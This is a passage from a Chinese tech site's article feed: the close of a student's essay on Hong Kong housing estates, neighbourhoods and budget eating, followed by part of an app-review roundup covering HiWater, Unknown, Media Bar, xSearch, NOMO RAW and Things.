ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/814b39c54223842605c8d147db159037.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/3361e2e88362b3fbcd4b83223262a739.png\"><figcaption><a href=\"https://www.thb.gov.hk/tc/psp/publications/housing/HIF2020.pdf\">房委会数据</a></figcaption></figure><blockquote><p><a href=\"https://zh.wikipedia.org/wiki/%E9%A6%99%E6%B8%AF%E5%85%AC%E5%85%B1%E5%B1%8B%E9%82%A8%E5%88%97%E8%A1%A8\">屋邨，又称为「公共屋邨」，由政府、志愿团体或私营企业兴建，再以低廉价格出租予低收入市民的住宅。截至 2021 年 8 月，香港共有 251 个公共屋邨，单位总计超过 85 万个。</a></p></blockquote>\n<p>因为香港的屋邨主要由三个机构提供，不同机构建设的屋邨可能有区别，但是屋邨也有一些共同的特点：</p>\n<ol>\n<li>屋邨基本上以大型的高层房屋为主，通常超过二十层。如果站在远处看，可以看到屋邨高大的外墙布满密密麻麻的窗户，像一只巨兽横卧在地上；晚上，灯光从一个个小小的窗户中透出，如点点繁星般梦幻。</li>\n<li>每个屋邨由若干大楼组成，有自己的配套设施，如食肆、医院、幼儿园、健身设施、菜市场、教堂，甚至自己的喷泉和滚轴溜冰场等，是配套齐全的大型综合社区；</li>\n<li>当然，对我来说，屋邨最明显的特点是外形规整，有大量重复的几何构造，以及明亮耀眼的色彩，有的屋邨墙壁上还会有艺术家的涂鸦。如果处理好光线和线条引导光线还是很容易出片的。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/14d595650b3ff3e835aa15816287fe84.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/7b2c8f283c0674b7bc38ea41ff779d23.jpg\"><figcaption>沙田区 乙明邨</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/e269858a0c0e1a0feaf95d38ba7c2dd8.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/a58b181b0041c4a83aac0abc321b6806.jpg\"><figcaption>沙田 沙角邨</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/17c35ee0ea845d5cf0d1b12511b6f7b9.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/97dca5140fbb0736d678f0ea2a2725b5.jpg\"><figcaption>沙田 沥源村</figcaption></figure><p>当然，要说最出名的公共屋邨，还是位于「彩虹」地铁站附近的彩虹邨。但是我认为不同的屋邨都有自己有趣的角落，只要多找找就能看到啦。</p>\n<p>屋邨最吸引我的，除了外墙缤纷的颜色，其实还有代表了尘封在我脑海很久的，对于香港生活的记忆和印象。</p>\n<p>我记得，我在屋邨闲逛的那天下午，阳光明媚，透过枝叶在墙面留下斑驳的光影。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/24c54d107daaca44a0109271311ef497.jpg\"><figcaption>沙田 沙角邨</figcaption></figure><p>我记得，在屋邨的滚轴溜冰场前，一个小女孩绕着一圈又一圈。不远处，一个大叔在大树下津津有味地看着报纸。走在房屋过道，有时候会听到电视节目的声音从虚掩着的门后传出来。啊，还是熟悉的节目播报声。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/82ea15394ecca0a8bea9aea575945546.jpg\"><figcaption>沙田 乙明邨</figcaption></figure><p>我想起小时候看香港电视台的天气预报，因为每天都会看，以至于主持人要说什么都能背下来：</p>\n<blockquote><p>本港录得最高气温三十二摄氏度，相对湿度百分之八十三，天气酷热，吹和缓嘅东至东南风，午间有几阵骤雨，展望未来有阳光……</p></blockquote>\n<p>接着，一个小人走入屏幕，然后吹着口哨离开。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/26/a05ff758d67f9c2a7aaa4e6a8782ae9c.png\"><figcaption>跟住落来睇下天气先生嘅预测</figcaption></figure><p>想起了我小时候在周四和周五一放学就会冲回家，因为要赶上 17：15 到 17：45 电视播放的剧集。周末会找各种理由流出家门，然后和同学坐在楼梯上玩游戏机。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/11eb2433904494cf8b0121832a7ff57d.jpg\"><figcaption>沙田 沥源村</figcaption></figure><p>又想起了周末我爸带我去吃好吃的，通常会是牛腩粉，但是一定不能告诉我妈，因为我妈觉得牛肉容易上火，酱汁很咸。但是我依然很喜欢吃，特别是捧着大碗大快朵颐，嘴里面被牛肉丸和牛腩塞满，心里面是很有成就感的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/43fb804cd43fdf496f5d8abc0f712553.jpg\"><figcaption>沙田 沙角街市</figcaption></figure><p>我总是很怀念曾经的时光，因为我已经不需要体验那段时光经历里的不安，伤心，愤怒，不解。后来，我家电视机坏掉了，不能再看香港的电视节目；那家牛腩粉店结业了；从小一起玩的朋友们也慢慢一个个搬走了……于是这些记忆就被封存起来，许久不被触碰。</p>\n<p>不过这些童年的瞬间，在我漫步屋邨时一个接一个在我脑海里复苏。以致于我看到一个个在广场疯跑，追着妈妈吹出来泡泡的小朋友，虽然之前素未谋面，但还是感觉似曾相识，心里面是对他们满满的羡慕。</p>\n<p>他们生活在缤纷的色彩中，我生活在缤纷的记忆里。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/ec4e59b2975866b9e9b63ce718df82b6.jpg\"><figcaption>沙田 大围</figcaption></figure><h3>中环 &amp; 上环：最西方和最东方的，最传统和最现代的</h3>\n<p>最近几天，终于有时间再去一次港岛，在中环和上环逛了一下。</p>\n<p>逛了一下午，感觉有两种定位的纠结在港岛人心目中挥之不去。香港岛是清政府最早割让给香港的租界，因此，这里的建筑和其他地区相比，更具有异国风景。无论是大馆（原香港中区警署驻地），还是巷子中随处可见的咖啡店和酒吧以及艺术涂鸦，这里仿佛是一个充满外国风情的圈子。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/2b92a7fb97688d4fc07d578d1b388a03.jpg\"><figcaption>中环街上随处可见的酒吧和外国人</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/330ace07989bf990e46ae30aff3ad5de.jpg\"><figcaption>中环 嘉咸街</figcaption></figure><p>但是又有一部分的街区，一部分的港岛在执拗地坚守属于中华文化的一部分。文武庙中，香火依然鼎盛；摩罗街上，古董书画随处可见；盂兰盆节到了，走在路上经常会闻到烧香的味道，大楼的公告栏上详细说明化宝盘的位置；活化后的中环街市重新迎客，许多白发苍苍的老人重回旧地，和晚辈们诉说街市以前杀鸡宰羊的位置；满街手写的繁体商铺名称，让我很确信他们对传统文化的执念。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/2ba9fbc5217db40790f1070e71b9a138.jpg\"><figcaption>上环 文武庙</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/81c5b51c3c9b2a92976b8720ed157ad8.jpg\"><figcaption>中环 中环街市</figcaption></figure><p>香港就是这样一个能让你时不时感到纠结和疑惑的地方。</p>\n<p>你能够看到高楼大厦，往上仰望得你脖子疼，「嘟嘟嘟嘟」的红绿灯提醒声音仿佛一直在催着路人往前走，硕大的霓虹灯牌和广告牌仿佛永远不会关掉。</p>\n<p>你也能看到叔叔阿姨坐在花坛上聊天，菜市场里买菜阿姨给送几块牛肉干给熟识的朋友，和经常去的几个摊档主人打招呼。</p>\n<p>可能也正是对两种截然相反的生活信条的共同追求，造就了现在的香港吧。</p>\n<h2>饮食：我有独特的薅羊毛技巧</h2>\n<p>香港的生活消费水平很高，如果是在一些购物商场或者热门购物街道吃饭，每顿的消费可以轻松到100块。虽然对于香港人来说，可能这算是正常的消费水平，但是我作为一个大陆来的穷学生，就是不想让他们赚那么多钱😜。在不断的摸索中，我也慢慢找到了薅羊毛的技巧，基本上可以每顿能维持在 45 港币（即 37 元人民币）以内。</p>\n<h3>不愿出门</h3>\n<p>如果不出门，那么就只能叫外卖了。一般来说，在香港叫外卖不会便宜，配送费从 5 元至 25 元不止，有的还必须加上 10 元的小费，如果需要免掉配送费，则通常需要消费超过 100 元以上。</p>\n<p>但是换个角度，「打不过就加入」，如果单点觉得贵，可以选择和舍友一起点外卖，有一些餐厅会有满 90 元优惠 40 元的优惠，或者有买一送一的优惠，这个时候和舍友一起点会比较划算。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/484a560cf392df227206bbed6470c4fc.png\"><figcaption>Uber eats和Food panda是比较常用的外卖平台</figcaption></figure><p>不过也有例外，如果碰巧你家楼下有中小型的茶餐厅，可以和老板娘混个脸熟，直接拿外卖电话和菜单。在需要的时候直接打电话订餐即可，这样既没有平台费用，如果恰逢不是很繁忙的时间段还可能可以免费送餐上门。</p>\n<h3>愿意出门</h3>\n<p>如果愿意出门，可以选择的方案就更多了：</p>\n<h4>菜市场</h4>\n<p>真正久经江湖的叔叔阿姨是从来不会去超市买菜的，菜市场才是他们真正厮杀的战场。超市里的五花肉 300g 卖 39 元，在菜市场 500g 卖 58 元；超市里的菜心 200g 卖 12 元，在菜市场 500g 卖 12~16 元，还送三根葱；烧好的蜜汁鸡翅 4 块 20 元，彩椒 3 个 10 元，鸡蛋 20 个 15 元……如果在菜市场买菜，能够比在百佳和惠康这种超市便宜 20%~40%，还有更多精彩等待你发现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/e2e4cf5d6a87160f12ea8761eba45c14.jpg\"><figcaption>沙田 沙角街市</figcaption></figure><h4>海皇粥店</h4>\n<p>主要经营各种扒餐（标配：饭+煎蛋+扒+酱汁+一杯饮料，煎蛋可以换成午餐肉、香肠等，酱汁亦有多种选择），粥类和炒面，基本款式价格在 30~50 元左右。该店还支持支付宝和微信直接付款，所以碰巧没带够现金也不用担心。在工作日可以询问一下是否有学生优惠，能够再优惠 4 元左右。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/7966a86ac7f8ecb9a516b970b3209f56.jpg\"><figcaption>这款套餐是42元</figcaption></figure><h4>大快活</h4>\n<p>主要经营各种扒餐（标配饭+煎蛋+扒+酱汁+一杯饮料，酱汁亦有多种选择），基本款式价格都在 40~50 元左右。同样支持支付宝和微信直接付款。在工作日可以询问一下是否有学生优惠，能够再优惠 4 元左右。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/aa33cdbce183274f1c576f0a7957a3e9.jpg\"><figcaption>这款套餐是40元</figcaption></figure><h4>外卖自提</h4>\n<p>如果想吃外卖，但是又想不花配送费，可以选择先打电话订餐，稍后再前往自提。这样只需要付 1~2 块打包费，且能够完全免去配送费。有一些小型的餐厅只提供自提而不提供外送，所以，如果愿意自取，可选择餐厅的范围还会大一点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/d9b358b5395cc17170d90e01c2412552.png\"><figcaption>一些餐厅外卖自提套餐还是挺划算的</figcaption></figure><h4>学校饭堂</h4>\n<p>学校饭堂的价格基本上能维持在低于市面正常价格线的水平上。我要就读的学校有差不多 40 个饭堂，所以丰富性也不用担心了。比如学校的套餐价格基本能够维持在 30 元~40 元，相对于外部的茶餐厅或者其他饭店来说，普遍能够低 10~20 元，分量挺足，一些菜式味道也很不错。有时候赶时间上课，或者下课后回家懒得做饭，学校饭堂是不错的选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/3adbd7d89d117fd0fb9cb6cee5adff12.jpg\"><figcaption>李卓敏基本医学大楼 套餐37元</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/84bc9dc2526c37eddb15211ce4a184f7.jpg\"><figcaption>联合书院饭堂 套餐40元</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/76b7d87b890b0bf97e563f85579d64c3.jpg\"><figcaption>新亚书院饭堂 套餐33元</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/c79fd855dae90ff5c5c3133d604984df.jpg\"><figcaption>医学院（威尔斯亲王医院）饭堂 套餐36元</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/a07aaa029577190b9a3ed9fce33d6e4b.jpg\"><figcaption>和声书院饭堂 套餐42元</figcaption></figure><h2>结语</h2>\n<p>这次来香港，感觉既熟悉又陌生。自己不再是作为一名游客去看待这座城市，而是作为一名香港的市民。但是，还是那个熟悉的语言环境，那个熟悉的文化氛围。漫步在城市，放眼望去，看到的每一帧画面，仿佛都可以唤起我已被淡忘的回忆。这个时候我才发现，香港的电视剧、电影、综艺、音乐、甚至只是闭上眼时，心里面想象中属于香港的名词；霓虹灯、番茄牛肉通心粉、繁体字的牌子……其实一直陪伴着我，从来没有远去，只是在我的脑海里沉睡，等待一次苏醒。</p>\n<p>来到香港才十几天，但是我仿佛已经彻底习惯了这里的生活。在屋邨拍照的时候，会和误以为我是房屋协会来检查晾晒的地拖是否干净整洁的老婆婆唠嗑上几句；回家或者出门的时候，会和楼下大堂的管理员点点头示意；在菜市场混迹于一大群叔叔阿姨中间，和食材和老板斗智斗勇……大概这就是我心里面的香港。当时间像一双手把一段经历拉长，再拉长，这个时候，杂质和浮尘被除掉，而我也有机会认真观察生活的纹理。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/ed6c6dfb3163b23ea6c0efbcc6587ff2.jpg\"><figcaption>中环 皇后大道中附近</figcaption></figure>\n","link":"https://sspai.com/post/68195"},{"title":"派评 | 近期值得关注的 App","date":"2021-10-04 08:31:15","description":"\n<p>本期《派评》的内容有：</p>\n<ul>\n<li>📷 iOS 专业相机应用 NOMO RAW 迎来大版本更新。</li>\n<li>🥛 除了记录喝水还不够，HiWater 还想帮你控制热量。</li>\n<li>📈 iWork 办公三件套迎来大更新，让线上协作更加便利。</li>\n<li>……</li>\n</ul>\n<p>你可以通过文章目录快速跳转到你感兴趣的内容。如果发现了其它感兴趣的 App 或者关注的话题，也欢迎在评论区和我们进行讨论。</p>\n<h2>不容错过的新 App</h2>\n<p>虽然少数派一直在为大家发发现和介绍各平台上的优质 App，但仍有不少设计、功能、交互、体验都非常优秀的 App，还没有被我们发掘和介绍。它们可能是一款老 App，也可能是近期上架的新 App，我们会在这里介绍给你。</p>\n<h3>HiWater：光记录喝水还不够，控制热量也很重要</h3>\n<ul>\n<li>平台：iOS / iPadOS</li>\n<li>关键词：饮水记录、健康追踪</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Vanilla\" user-id=\"bs2ov5lb34tch278f9ag\" href=\"https://sspai.com/u/whoops\">@Vanilla</a>：作为老牌喝水应用 WaterMinder 的用户，我对这款 App 已经非常满意。可是，当我看到 HiWater 后，我才后知后觉得发现 WaterMinder 缺少了点什么，那就是对摄入热量的提醒。</p>\n<p>在「今日」标签页，HiWater 展示了当日的饮水进度和详细的记录历史，这是它与其它喝水应用相同的功能。不过，每日补水目标下方的饮水金字塔就非常有意思了，它将常见饮品分为 6 个健康等级，用来衡量各类饮品的摄入比例。金字塔底端的白水是健康补水的首选，而位于顶端的饮品应加以控制。也就是说，我每天除了要完成饮水数量的目标，还要注重摄入水分的质量，如果热量太高导致超标，也是一件得不偿失的事情。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi7db34teh0gc1kig.jpeg\"></figure><p>在设置界面中，我可以调整「饮水金字塔」的比例：对正常用户来说白水的比例要大于等于 60%，而对于需要控制热量输入的人群来说白水的比例要大于等于 70%，大家可以各取所需。在「饮品目录」标签页中，我可以查询到每一类饮品每 100 毫升所含的热量，根据热量大小从 LV1 到 LV6 分门别类。每次我记录饮水，体积和热量会同时被记录，然后反映到每日补水目标和饮水金字塔两个不同的监测进度上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi7lb34teh5fkvjt0.jpeg\"></figure><p>最后值得一提的是 HiWater 添加饮品记录的方式，除了常规的应用内添加，还可以通过小组件和 Siri 捷径来快递添加相应的饮品，非常方便。HiWater 的小组件可以点名表扬，因为它不是单纯地展示数据，而是可以进行交互，就像快捷指令 App 的小组件一样，点击就会触发相应的动作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi7tb34teit0pn1ng.jpeg\"></figure><p>如果说 HiWater 在设计方面可能还不如 WaterMinder 来得更加美观，但是在功能科学性和实用性方便已经远远超过后者，而我也自然而然地投奔了 HiWater 的阵营。目前，HiWater 可以在 <a href=\"https://apps.apple.com/cn/app/hiwater-%E5%81%A5%E5%BA%B7%E9%A5%AE%E6%B0%B4%E6%8C%87%E5%8D%97/id1561732866\" target=\"_blank\">App Store</a> 下载，售价 6 元。</p>\n<span class=\"ss-application\" app-id=\"16175\"> </span><h3>Unknown：遇事不决，用它解决</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：决策、工具集</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Noah_Choi\" user-id=\"bs2oudlb34tch2787tn0\" href=\"https://sspai.com/u/69zxdqx8\">@Noah_Choi</a>：俗话说「两个天秤座不能一起出去吃饭，不然会饿死」。作为天秤座，我最讨厌做选择题，无论是买东西、看电影还是吃饭、逛景点，我都要去纠结应该吃什么、看什么、去哪里，眨眼功夫就浪费了半个小时，所以我需要一个找到了一个能替我做选择的工具：Unknown。</p>\n<p>正如其名，Unknown 是一个解决未知问题的应用，它里面包含了 6 种小工具，其中不乏我们所熟知的扔骰（tóu）子和猜硬币功能，其中前者可以通过摇晃手机触发投掷，并且支持自定义骰子数量，掷出后会直接给出点数总和，所以除了做选择题，大家在聚会时还可以在各自手机上安装好 Unknown 来猜大小喝酒呢。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi85b34teit0pn1o0.png\"></figure><p>随机数和列表功能也非常实用，它们也都允许自定义结果数量。随机数在年会抽奖时非常有用，我们将员工工号的起始和结束分别设定为两个极限就可以，酷安社区中甚至还有用户用该功能「预测」考试分数，可以见得大家已经找到了使用 Unknown 的新方式。</p>\n<p>值得一提的是，Unknown 中有一个「真随机数」开关，其实我们在任何计算机系统中获取的随机数都是通过算法得来的「伪随机数」，甚至部分算法为了给出「符合固有印象」的随机结果，还会屏蔽真随机时可能会出现的重复结果。Unknown 这一功能开启后应用会联网调用 Random.org 的数据，它是通过 <a href=\"https://en.wikipedia.org/wiki/Atmospheric_noise\" target=\"_blank\">Atmospheric Noise</a> 即大气噪声来获取数据的随机性。正是因为这些数据「不靠谱」，所以随机性才会「更靠谱」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi8tb34teit0pn1og.png\"></figure><p>列表功能除了可以决定你今晚吃什么以外，用来给真心话大冒险出题也是个不错的选择，Unknown 允许用户添加多个列表，在答案后面添加「#」和数字就可以设定出现概率。如果是很多很多答案，我们可以直接在电脑上编辑好文本文件导入到 Unknown 里，省时省力又很人性化。</p>\n<p>除了以上常用功能，Unknown 还可以抽扑克牌和给出随机色功能，并且主界面左上角有结果历史记录，说不定大家可以从中发现概率分布的秘密呢。如果你也需要一个能解决大到宇宙奥秘、小到今晚吃什么的小工具，可以前往 <a href=\"https://www.coolapk.com/apk/cn.icyflame.unknown\" target=\"_blank\">酷安</a> 免费下载 Unknown。</p>\n<span class=\"ss-application\" app-id=\"16176\"> </span><h3>Media Bar：通过状态栏实时查看播放进度</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：状态栏、播放控制</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Peggy_\" user-id=\"bs2p015b34tch278nkdg\" href=\"https://sspai.com/u/5isr02uh\">@Peggy_</a>：通常来说，一首歌的时间是 4 分钟左右，我还记得几年以前我总会计算自己上学路上能听完几首歌，有时候听歌听到睡着，路途继续，音乐不停。现在工作了，我还是会经常盯着一首歌的进度条，从前奏响起到高潮再到歌曲终了，感受时间的流逝，Media Bar 这一应用则尝试将音乐的进度变得可视化，让我在手机的任一应用界面都能看见音乐。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi95b34teh5fkvjtg.jpeg\"></figure><p>安装好 Media Bar 后，我们需要给予它辅助功能权限和通知权限，以便其读取音乐播放进度并方便其控制音乐播放行为。简单设置完成后，Media Bar 会在系统状态栏显示一个彩色进度条，进度条会随着播放进度逐渐走到屏幕尽头，我们可以根据自己的喜好来选择进度条的起点是中间还是两端，从而达到不同的视觉效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi95b34teh5fkvju0.jpeg\"></figure><p>Media Bar 的个性化定制功能主要体现在进度条的样式上，可供修改的地方有进度条的颜色、宽度、点击行为等。譬如我们可以根据时间来将进度条划分为不同的颜色，当播放至相应的时间点时，进度条也会随之变色。此外我们还可以选择将进度条显示在屏幕顶端还是状态栏下方。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi9db34teh0gc1kj0.jpeg\"></figure><p>Media Bar 将点击进度条的动作分为单击、双击和长按，我们可以按照自己的使用习惯将相应的行为设置为暂停/播放、快进/快退乃至是切换不同的应用等等。</p>\n<p>Media Bar 应用本体及基础功能免费，应用内有广告，去除广告、解锁更多进度条样式和点击动作则需要付费。你可以通过 <a href=\"https://play.google.com/store/apps/details?id=apps.ijp.mediabar\" target=\"_blank\">Play Store</a> 下载使用 Media Bar。</p>\n<span class=\"ss-application\" app-id=\"16178\"> </span><h3>xSearch：「全球」搜索一处搞定</h3>\n<ul>\n<li>平台：iOS / iPadOS</li>\n<li>关键词：搜索、扩展</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@红酒皇\" user-id=\"bs2p85tb34tcs0pmdeeg\" href=\"https://sspai.com/u/Fabrina\">@红酒皇</a>：天下苦搜索引擎久矣。有的时候为了在特定的场景搜索，需要在关键词后输入搜索引擎，对于频繁切换的搜索动作来说，操作起来还是免不了一番麻烦。现在，恰由于 Safari 可以添加 xSearch 插件了，用户们可以直接在搜索框中输入明确的搜索引擎，快速跳转至特定的搜索场景中。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi9lb34teh5fkvjug.png\"></figure><p>xSearch 的使用十分简单，是爸爸妈妈都可以一下子学会的轻便工具。只需要记得在「我的引擎」中记录的快捷键名称，在搜索框中输入「快捷键+空格+关键词」，就可以在 Safari 中实现各大网站的快捷搜索。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi9tb34teit0pn1p0.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbia5b34teh3cl8sfg.png\" alt=\"\"></figure><p>在引擎库中，用户还可以激活常用的搜索引擎，包含知乎、简书、豆瓣、V2EX 等多种预设网站，快速实现搜索操作的正中红心，避免在无效信息中筛选的时间浪费。除了预设外，用户当然可以手动添加常用搜索引擎。比如创建一个「少数派」专用搜索，就可以直接将搜索页面的关键词替换为「%s」后将链接添加至「我的引擎」中，设置好快捷键后就可以立即使用了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/04/dabed7045a0502fcdce7a8ae7b98a927.gif\"></figure><p>你可以在 <a href=\"https://apps.apple.com/cn/app/xsearch-for-safari/id1579902068\" target=\"_blank\">App Store</a> 购买 xSearch ，应用售价 12 元。</p>\n<span class=\"ss-application\" app-id=\"16177\"> </span><h2>值得关注的 App 更新</h2>\n<p>除了「新鲜」App，App Store 中的许多老面孔也在不断迭代、更新，增加更多有趣和实用的功能。少数派希望帮你筛选 App Store 中值得关注的 App 动态，让你快速了解 App 和开发者们的最新动态。</p>\n<h3>NOMO RAW：iOS 上的专业相机 App，现以更 Pro 的姿势呈现</h3>\n<ul>\n<li>平台：iOS</li>\n<li>关键词：摄影、RAW</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Vanilla\" user-id=\"bs2ov5lb34tch278f9ag\" href=\"https://sspai.com/u/whoops\">@Vanilla</a>：如果你和我一样是一名手机摄影爱好者，并且恰好你使用的手机是 iPhone 12 Pro 系列或者 iPhone 13 Pro 系列，那么你一定要尝试一下 NOMO RAW，因为它赋予了 iPhone 摄影更加强大的功能，不管是日常记录还是专业拍摄，都能获得绝佳的创作体验。</p>\n<p>在 iOS 15 正式发布后，NOMO RAW 更新到了 2.0 版本，新增了一个 ProRAW 编辑器，这也就是意味着我在拍照的时候可以像使用原生相机一样来使用 NOMO RAW，只需要专注于「构图」，其它所有事情都可以在拍摄结束后再一一调整。</p>\n<p>首先，我要确保自己在相机界面的左上角打开 RAW，也就是说我选择的格式需要是 RAW+HEIF 或者 RAW+JPEG，这样才可以在拍摄好的图片下面看到「编辑图片」和「版本管理」的按钮。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbiatb34teit0pn1pg.jpeg\"></figure><p>在「编辑图片」界面中，我可以针对图片进行画幅比例、色彩方案、曝光（RAW）、色温（RAW）、色调（RAW）、锐化（RAW）、阴影（RAW）、高光、对比度、饱和度、胶片颗粒、暗角等多达 11 项的调整，其中有 5 项是专门针对 RAW 格式的照片来进行。需要注意的是，在 NOMO RAW 中参数调节的交互逻辑和 iOS 自带相机中的完全相反，一开始可能需要适应一下。在编辑器中还有一个贴心的小功能，那就是「放大镜」辅助工具，飞猪老师说灵感来自胶片摄影中的「观片器」，可以让我在看到局部细节的同时看到整张图片的效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbib5b34teh3cl8sg0.jpeg\"></figure><p>这个「放大镜」辅助工具是为了服务于编辑器中的「RAW 锐化」调节，以及全新加入的一组胶片色彩方案。在 NOMO RAW 2.0 版本中，新增的 9 个色彩方案包括了：</p>\n<ul>\n<li>f1: Fujicolor Pro 160C</li>\n<li>f3: F-CP TYPE3510</li>\n<li>f4: Fujicolor Superia 400</li>\n<li>k1: Kodak Portra 160</li>\n<li>k2: KODAK VISION 2382</li>\n<li>k4: Kodak Portra 400</li>\n<li>a1: Agfa Portrait 160</li>\n<li>a4: AgfaPhoto Vista 400</li>\n<li>x4: Kodak Tri-X 400</li>\n</ul>\n<p>经过我这几天的使用，我个人最喜欢的是 f1: Fujicolor Pro 160C、f3: F-CP TYPE3510 和 k4: Kodak Portra 400。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbibdb34teit0pn1q0.jpeg\"></figure><p>「版本管理」是另外一个非常实用的功能，我在 NOMO RAW 中不管是针对画幅比例、色彩方案还是参数调整，都可以记录为一个单独的版本或者覆盖原有的版本。在实际使用中，我会针对同一张照片做不同风格的调整，然后在「版本管理」中保存为不同的副本，最后再筛选出自己喜欢的那张照片。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbiblb34teh0gc1kk0.jpeg\"></figure><p>NOMO RAW 可以在 <a href=\"https://apps.apple.com/cn/app/nomo-raw-%E4%B8%93%E4%B8%9A-proraw-%E7%9B%B8%E6%9C%BA/id1572429540?mt=8&amp;ign-mpt=uo%3D4\" target=\"_blank\">App Store</a> 免费下载，但是需要付费订阅使用，价格为 13 元/月或者 98 元/年。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/67661\" target=\"_blank\">功能强大也能轻松上手，它想成为你的 iPhone 默认相机：NOMO RAW</a></p>\n<span class=\"ss-application\" app-id=\"16098\"> </span><h3>Things：适配 iOS / iPadOS 15 新特性</h3>\n<ul>\n<li>平台：iOS / iPadOS / macOS / watchOS</li>\n<li>关键词：任务管理</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Snow\" user-id=\"bs2od75b34tch2730o80\" href=\"https://sspai.com/u/ul0vcezb\">@Snow</a>：上周，著名待办应用 <a href=\"https://sspai.com/app/Things%203\" target=\"_blank\">Things</a> 更新了 3.15 版，增加了大量对 iOS 15 和 iPadOS 15 新特性的适配功能。</p>\n<p>首先是在已经不怎么「小」的小组件上的改进，Things 在第一时间适配了 iPad 全新超大号组件，你可以在这个 2X4 的组件中查阅接下来几天中要做的事，又或是任意一个待办清单。这次任务就在桌面上看着你们呐，还有什么理由忘记呢？新版部件也不再强制与应用主题同步，你可以在「设置 - 外观」中任意更改为浅色或暗色，不再影响你的桌面美化大计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbic5b34teh5fkvjv0.png\"></figure><p>不仅是外观得到优化，小组件在易用性和隐私上也有所提升。小组件上的「+」号得到了一定扩展，你可以通过长按编辑小组件更改「+」号的跳转逻辑，选择进入默认收件箱或当前列表创建新任务。当然，你也可以选择禁用「+」号，让小组件看起来更为简洁。而当你的设备锁屏时，小组件上所有的任务都会被自动「打码」，不会被他人轻易窥视了。</p>\n<figure class=\"image ss-img-wrapper\"><img 